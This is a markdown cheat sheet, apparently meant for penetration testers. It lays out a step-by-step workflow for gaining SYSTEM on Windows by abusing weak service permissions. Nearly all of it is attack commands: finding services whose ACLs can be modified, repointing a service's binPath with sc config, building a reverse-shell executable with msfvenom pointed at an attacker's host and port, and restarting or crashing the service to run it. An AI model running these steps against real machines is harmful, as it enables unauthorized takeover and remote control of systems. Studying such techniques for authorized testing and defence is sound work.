# Windows Privilege Escalation – Weak Service Permissions

## Purpose

This file provides a structured workflow for identifying and exploiting weak service permissions for privilege escalation.

Core rules:
- Services run as SYSTEM or admin
- If you can modify service configuration → you control execution
- No need to modify binaries directly
- Restart triggers execution

---

## 0. Mental Model

Service configuration defines:
- what runs
- how it runs

If you can modify it:
→ you control what SYSTEM executes

---

## 1. Enumerate Services (CRITICAL FIRST STEP)

cmd:

sc query state= all

---

## 2. Check Service Configuration

sc qc <service_name>

Look for:
- BINARY_PATH_NAME
- SERVICE_START_NAME

---

## 3. Check Service Permissions (CRITICAL)

Use accesschk:

accesschk.exe -uwcqv "Users" *

OR:

accesschk.exe -ucqv <service_name>

---

## 4. Identify Weak Permissions

Look for:

- SERVICE_CHANGE_CONFIG
- SERVICE_ALL_ACCESS
- WRITE_DAC
- WRITE_OWNER

If present:
→ exploitable

---

## 5. Exploit: Modify Service Binary Path

Change service to execute your payload:

sc config <service_name> binPath= "C:\Temp\payload.exe"

(Note: space after binPath= is required)

---

## 6. Generate Payload

msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

---

## 7. Place Payload

copy payload.exe C:\Temp\payload.exe

---

## 8. Restart Service (TRIGGER EXECUTION)

sc stop <service_name>
sc start <service_name>

---

## 9. Verify SYSTEM

whoami

Expected:

nt authority\system

---

## 10. Restore Original Configuration (OPTIONAL)

sc config <service_name> binPath= "C:\original\service.exe"

---

## 11. Alternative: Change Service to CMD

sc config <service_name> binPath= "cmd.exe /c <command>"

---

## 12. If Cannot Stop Service

Try:

- reboot system
- wait for service restart
- crash service (if possible)

---

## 13. PowerShell Alternative

Get-Service

---

## 14. Common Failure Points

- no SERVICE_CHANGE_CONFIG permission
- service cannot be restarted
- payload blocked by AV
- wrong syntax in sc config

---

## 15. If Stuck

- re-check permissions with accesschk
- try different service
- verify payload path exists
- ensure correct syntax

---

## 16. Quick Exploit Pattern

1. enumerate services
2. identify weak permissions
3. modify binPath
4. place payload
5. restart service
6. get SYSTEM shell

---

## 17. Mental Model

Service config = execution control  
Weak permissions = access  
Restart = trigger  
SYSTEM = result  

---

## 18. Golden Rules

- Always check service ACLs early
- SERVICE_CHANGE_CONFIG = immediate win
- Use simple payloads if AV present
- Syntax matters (space after binPath=)
- Restart triggers execution